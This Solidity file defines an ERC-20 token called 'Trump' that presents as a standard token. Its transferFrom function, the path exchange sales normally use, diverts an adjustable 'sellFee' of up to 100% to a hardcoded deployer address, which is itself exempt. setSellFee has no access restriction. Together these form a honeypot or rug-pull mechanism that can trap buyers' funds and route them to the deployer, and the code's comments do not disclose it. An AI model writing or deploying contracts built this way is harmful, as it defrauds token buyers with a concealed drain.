// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.20;

contract Trump {
    string public constant name = "Trump";  
    string public constant symbol = "Trump";  
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100_000_000 * 10**decimals;

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    address payable constant deployer = payable(address(0xaa27B750Ad58223A0f45F13b746e848f6533982d)); 

    uint256 public sellFee = 0; 

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function approve(address spender, uint256 amount) external returns (bool){
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool){
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool){
        uint256 feeAmount = 0;
        uint256 transferAmount = amount;

        // Check if the transfer is a sell (from token holder to external address)
        if (from != deployer && to != deployer) {
            feeAmount = (amount * sellFee) / 100; // Calculate fee
            transferAmount = amount - feeAmount; // Subtract fee from transfer amount
        }

        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += transferAmount;
        balanceOf[deployer] += feeAmount; // Add fee to deployer's balance

        emit Transfer(from, to, transferAmount);
        emit Transfer(from, deployer, feeAmount);

        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal returns (bool){
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = balanceOf[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        unchecked {
            balanceOf[from] = fromBalance - amount;
        }
        
        // Transfer the full amount without fees
        balanceOf[to] += amount; 
        
        emit Transfer(from, to, amount);
        return true;
    }

    function setSellFee(uint256 newSellFee) public {
        require(newSellFee <= 100, "Sell fee cannot exceed 100%");
        sellFee = newSellFee;
    }
}
